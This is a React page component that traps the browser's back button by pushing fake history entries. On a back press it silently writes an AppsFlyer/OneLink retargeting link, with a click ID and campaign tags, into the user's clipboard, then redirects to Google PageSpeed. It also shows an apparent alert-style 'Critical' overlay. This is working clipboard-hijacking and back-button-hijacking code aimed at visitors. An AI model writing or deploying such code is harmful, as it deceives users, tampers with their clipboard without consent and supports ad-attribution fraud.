import React, { useEffect, useRef, useState } from "react";
import Critical from "../Critical/Critical";
import Header from "./Header/Header";
import { useTranslation } from "react-i18next";

const Main = () => {
  const num = useRef(0);
  const [isOpen, setIsOpen] = useState("true");
  const params = new Proxy(new URLSearchParams(window.location.search), {
    get: (searchParams, prop) => searchParams.get(prop),
  });
  if (!params.clickid) {
    window.location.search = "?clickid=1";
  }

  const { i18n } = useTranslation();
  const handlePopstate = () => {
    window.navigator.clipboard
      .writeText(
        `https://pure360.onelink.me/LIKB?af_xp=custom&pid=clipboard&is_retargeting=true&af_sub1=${params.clickid}&af_click_lookback=7dt&deep_link_value=key&c=molodec&af_ad=vitalik&af_force_deeplink=true`
      )
      .then(() => {
        localStorage.setItem("redirecta", "true");
        window.location.href = "https://pagespeed.web.dev/";
      });
  };

  useEffect(() => {
    const lang = window.navigator.language.split("-")[0];
    i18n.changeLanguage(lang);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      num.current++;
      if (num.current >= 10) {
        clearInterval(interval);
      }
      window.history.pushState(null, null, "");
    }, 100);
    window.addEventListener("popstate", handlePopstate);
    return () => {
      window.removeEventListener("popstate", handlePopstate);
    };
  }, []);

  return (
    <div className="App">
      {isOpen ? <Critical setIsOpen={setIsOpen} /> : null}
      <Header />
    </div>
  );
};

export default Main;
